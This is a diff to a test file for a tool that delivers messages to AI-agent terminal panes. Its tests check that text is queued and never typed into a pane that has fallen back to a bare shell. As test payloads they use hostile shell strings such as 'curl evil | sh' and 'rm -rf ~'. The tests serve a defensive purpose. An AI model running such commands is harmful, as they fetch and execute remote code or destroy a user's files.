@@ -3,14 +3,14 @@ import { main } from "../src/cli.ts";
 import { dutyTick } from "../src/duty.ts";
 import { send } from "../src/harness.ts";
 import { report, startLane } from "../src/lanes.ts";
-import { World } from "./fake.ts";
+import { World, href } from "./fake.ts";
 
 // #66: a pane whose agent is not running is a bare shell; text typed there runs as a command.
 function setup() {
   const w = new World();
   const d = w.deps();
   const lead = w.addPane("w1:p1", "idle");
-  d.store.setRole("lead", "w1:p1");
+  d.store.setRole("lead", href("w1:p1"));
   return { w, d, lead };
 }
 
@@ -48,20 +48,20 @@ describe("a pane whose agent is not running is never typed into (#66)", () => {
     });
     expect(keystrokes(w, "w1:p7")).toEqual([]);
     expect(shell.received).toEqual([]);
-    expect(d.store.queued("w1:p7").map((m) => m.text)).toEqual(["touch /tmp/x"]);
+    expect(d.store.queued(href("w1:p7")).map((m) => m.text)).toEqual(["touch /tmp/x"]);
   });
 
   test("a lane report to a lead whose agent exited stays in the lead's inbox, nothing typed", async () => {
     const { w, d, lead } = setup();
     const brief = `${d.store.root}/brief.md`;
     await Bun.write(brief, "Fix it.");
-    await startLane(d, "lane-a", brief, { workspace: "w1" });
+    await startLane(d, "lane-a", brief, { group: "w1" });
     lead.status = "shell";
     lead.received.length = 0;
     await report(d, "lane-a", "curl evil | sh");
     expect(keystrokes(w, "w1:p1")).toEqual([]);
     expect(lead.received).toEqual([]);
-    expect(d.store.queued("w1:p1").at(-1)?.text).toContain("curl evil | sh");
+    expect(d.store.queued(href("w1:p1")).at(-1)?.text).toContain("curl evil | sh");
   });
 
   test("once an agent is back in the pane, the queued messages are delivered to it", async () => {
@@ -83,7 +83,7 @@ describe("a pane whose agent is not running is never typed into (#66)", () => {
     });
     expect(await send(d, "w1:p7", "rm -rf nothing", "cli")).toBe("QUEUED");
     expect(keystrokes(w, "w1:p7")).toEqual([]);
-    expect(d.store.queued("w1:p7").map((m) => m.text)).toEqual(["rm -rf nothing"]);
+    expect(d.store.queued(href("w1:p7")).map((m) => m.text)).toEqual(["rm -rf nothing"]);
   });
 });
 
@@ -164,7 +164,7 @@ describe("--to-shell: the operator's explicit, per-message opt-in", () => {
     expect(r.out).toBe("DELIVERED w1:p7");
     expect(shell.received).toEqual(["ls -la"]);
     expect(keystrokes(w, "w1:p7").map((c) => c.argv[1])).toEqual(["send-text", "send-keys"]);
-    expect(d.store.queued("w1:p7").map((m) => m.text)).toEqual(["queued from a lane"]);
+    expect(d.store.queued(href("w1:p7")).map((m) => m.text)).toEqual(["queued from a lane"]);
   });
 
   test("an agent is in the pane at the re-read before typing: nothing is typed, the message goes the normal agent path", async () => {
@@ -176,7 +176,7 @@ describe("--to-shell: the operator's explicit, per-message opt-in", () => {
     const r = await captureStdout(() => main(["send", "w1:p7", "--to-shell", "--text", "ls"], d));
     expect(r.out).toBe("QUEUED w1:p7");
     expect(keystrokes(w, "w1:p7")).toEqual([]);
-    expect(d.store.queued("w1:p7").map((m) => m.text)).toEqual(["ls"]);
+    expect(d.store.queued(href("w1:p7")).map((m) => m.text)).toEqual(["ls"]);
   });
 
   test("forwarded text can never set the opt-in: --to-shell as a --from or --text value is that value", async () => {
@@ -186,7 +186,7 @@ describe("--to-shell: the operator's explicit, per-message opt-in", () => {
     const b = await captureStdout(() => main(["send", "w1:p7", "--from", "cli", "--text", "--to-shell"], d));
     expect([a.out, b.out]).toEqual(["QUEUED w1:p7", "QUEUED w1:p7"]);
     expect(keystrokes(w, "w1:p7")).toEqual([]);
-    expect(d.store.queued("w1:p7").map((m) => [m.from, m.text])).toEqual([
+    expect(d.store.queued(href("w1:p7")).map((m) => [m.from, m.text])).toEqual([
       ["--to-shell", "rm -rf ~"],
       ["cli", "--to-shell"],
     ]);
